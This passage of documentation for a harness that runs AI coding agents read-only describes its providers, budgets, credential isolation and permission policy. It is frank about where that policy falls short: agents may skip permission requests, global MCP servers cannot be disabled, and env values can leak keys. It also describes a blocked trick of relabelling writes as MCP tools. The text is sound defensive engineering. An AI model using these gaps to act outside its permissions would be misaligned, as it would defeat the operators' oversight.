What the loop gives the model: the read-only tools `read_file`, `list_dir`, `grep`, `glob`,
`bash` (the same `permissions.bash` allow-list as every other provider) and `web_fetch` (the
same `permissions.fetch` host list, checked by the policy and again inside the tool), plus
every tool from the MCP servers in the workspace's `.mcp.json`, named `mcp__<server>__<tool>` so
existing `mcp__` permission rules keep meaning what they meant. There is no write tool to deny:
read-only is a property of the tool set here, not a policy applied over someone else's tools.

The note comes back through a `submit_note` tool whose parameters are the run's note schema, so
structured output works on endpoints that support no `response_format` at all. A model that
answers in prose is reminded once and then the session ends.

Cost comes from `openai.price` and the token counts in each response; with no price block, cost
is reported as `0` and `budget.maxUsd` never triggers, leaving `budget.maxTurns` and
`budget.maxMinutes` to bound the run. As the prompt passes 80% of `maxContextTokens`, the oldest
tool results are replaced with `[trimmed]`, keeping the six most recent, so a long investigation
degrades instead of failing at the endpoint's limit.

`openai.apiKey` is resolved once, at startup, and held in memory: it is never written to a run
directory and never printed by `sirdar doctor`. What the session's own processes get is not
Sirdar's environment with the credentials taken out, but a small one built from nothing:
`PATH`, `HOME` and `LANG`, each only when Sirdar itself has it. An allow-listed shell command
gets exactly those three. An MCP server gets those three plus whatever its own `env` block in
`.mcp.json` asks for.

That last part is the gap worth knowing. Values in `.mcp.json` expand `${VAR}` and `$VAR` from
Sirdar's process environment, so a server entry containing
`"env": {"KEY": "${OPENROUTER_API_KEY}"}` hands that key to that server, and nothing elsewhere
in the run undoes it. `.mcp.json` is the workspace's own file, and reading it is the control;
no other path in a run passes a credential to a child process.

`billing:` does not apply: it exists to tell the Claude adapter whether to keep
`ANTHROPIC_API_KEY` in place, and this provider is always billed against the key you configure.

`sirdar doctor` reports two rows for it, from `GET {baseUrl}/models`:

```
[OK] openai endpoint — https://openrouter.ai/api/v1
[OK] openai model — qwen/qwen3-coder
```

Not in v1: streaming, image content parts, `response_format: json_schema`, and resuming a
session in a later process (`sirdar resume` starts a fresh session instead, because the
transcript lives in the Sirdar process that ran it).

### `provider: acp`

The Agent Client Protocol is one JSON-RPC dialect that about forty coding agents already speak,
so one adapter reaches all of them: Gemini CLI, Goose, OpenCode, Qwen Code, Kimi CLI, Crush,
Junie, Augment, GitHub Copilot CLI, Cursor, Devin, and Claude Code and Codex through the ACP
adapters. `acp.command` and `acp.args` are the agent's launch command;
`docs/research/providers/acp-agents.md` lists the ones Sirdar knows about and what each is
started with.

```yaml
provider: acp
acp:
  command: gemini
  args: ["--experimental-acp"]
  env: {}
```

Sirdar spawns that agent, initializes it, opens a session in the workspace root and hands it the
stdio MCP servers from the workspace's `.mcp.json`, in ACP's own `mcpServers` shape. The agent
authenticates however its own CLI does, so `acp.env` is added to its environment rather than
replacing it, and it holds literal values: anything put there reaches a child process, which is
what a `keychain:` reference exists to prevent. Leave credentials in your shell and let the
agent read them from there.

What a run gives up by going through ACP, and why:

- **No cost signal.** ACP's `usage_update` carries the agent's context `used`/`size` and an
  optional session cost, and most agents send neither, so `budget.maxUsd` usually never fires.
- **Almost nothing for `budget.maxTurns` to count.** One ACP turn is a whole prompt turn: the
  agent may make dozens of model requests and run dozens of tools inside a single
  `session/prompt`, and the protocol reports one turn for all of it. An ACP run normally ends
  at turn one, or two if the note had to be retried, so a turn budget of 20 and a turn budget
  of 2 stop the same runaway agent — which is to say neither does. **`budget.maxMinutes` is the
  bound that actually works here.** Set it as if it were the only one.
- **No rate-limit signal.** ACP has no equivalent of Claude Code's `rate_limit_event` or Codex's
  `account/rateLimits/updated`, so a spent window arrives as an error and the queue does not
  pause for it.
- **No schema-constrained output.** `session/prompt` has no schema field, so the note schema goes
  into the prompt and the agent's own message is parsed as JSON at the end of the turn. A
  ```` ```json ```` fence is unwrapped and a prose preamble tolerated — the last top-level JSON
  object in the message is taken — but a message with no object in it at all earns the usual one
  retry turn, sent as a second `session/prompt`.
- **No reason on a denial.** When the agent asks permission, the client may only pick one of the
  options the agent itself offered — there is no field for a message the model would see. Sirdar
  picks the `reject_once` option and records the policy's reason in the event log, and the
  read-only instruction is already in the prompt so the model is not left guessing.

#### What the permission policy can and cannot reach

An ACP agent is a whole CLI, not a tool runner Sirdar drives. It owns its own tools, its own
configuration and, in most cases, its own globally configured MCP servers, and the protocol
gives a client no way to see or switch any of that off. Two consequences are worth stating
plainly, because they are weaker than what the same settings mean for `provider: claude`:

- **`mcp.workspaceOnly` cannot be enforced.** Sirdar passes the workspace's `.mcp.json` servers
  in `session/new`, and the agent adds them to whatever it already has. There is no ACP
  equivalent of `--strict-mcp-config`, so if your Gemini CLI or Goose install has global MCP
  servers configured, the session gets those too. Check the agent's own config if that matters.
- **The workspace's `.mcp.json` `env` values cross the wire.** They are sent to the agent in
  `session/new` so it can start those servers itself, which means any secret expanded into that
  block ends up in the agent's process, not just Sirdar's.

Permission checks are advisory in the same way. `session/request_permission` is sent at the
agent's discretion — some agents ask before every write, some ask only outside their own
sandbox, some never ask — so Sirdar's policy governs what it is asked about and nothing else.
When it is asked, ACP names the *kind* of the call rather than the agent's own tool name, so
`edit`/`delete`/`move` are judged as `Write` and `execute` as `Bash` against `permissions.bash`
whatever the agent titled them; `fetch` is judged as `WebFetch` against `permissions.fetch`,
with the URL read out of the request's `rawInput` and a request Sirdar can find no URL in
declined; `read` is judged as `Read` and `search` as `Grep`; an MCP tool names itself in full
and goes through `permissions.mcp` unchanged; and a call whose kind the protocol did not state
is denied, which is the read-only posture applied to the unknown. The five kinds above whose
meaning the protocol settles — the three writes, `execute` and `fetch` — are judged on the kind
alone, so an agent cannot route a write or a fetch through the laxer MCP rules by titling it
`mcp__editor__apply_diff` or `mcp__browser__get_page`.

When an `edit`, `delete`, `move`, `execute` or `fetch` tool call completes having never produced
a permission request, the run records an error event naming it. Nothing can be undone at that
point — the write, or the request, already happened inside the agent's process — but it is the
difference between finding out and not. An agent that raises that warning is one to run against
a scratch checkout, or not at all.

Sirdar declines the write-file and terminal client capabilities at `initialize`, so a
well-behaved agent never asks Sirdar to write a file or open a terminal *on its behalf*; one
that asks anyway gets a JSON-RPC error and the attempt shows up as a denied permission event.
That says nothing about what the agent can do with its own tools. It does advertise
`fs/read_text_file` and serves it, for files inside the workspace root only — resolved through
symlinks, so a link inside the workspace pointing out of it is refused — and for at most 8 MiB
per read.

Traffic naming a session Sirdar did not open is dropped, and requests naming one are refused.
Some agents spawn nested subagent sessions of their own; their messages are not this run's
transcript, and their tool calls are not this run's to approve.

Resume works where the agent advertises `loadSession`: the run's handle is the ACP `sessionId`,
and a later run reopens it with `session/load`. An agent without that capability makes
`sirdar resume` start a fresh session rather than continue the old one.

`sirdar doctor` starts the configured agent, initializes it and reports what it said about
itself — its name and version, the protocol version, and whether it supports `loadSession` and
image prompts — then shuts it down again. That is the cheapest way to find out whether an agent
you have not run before works here at all.
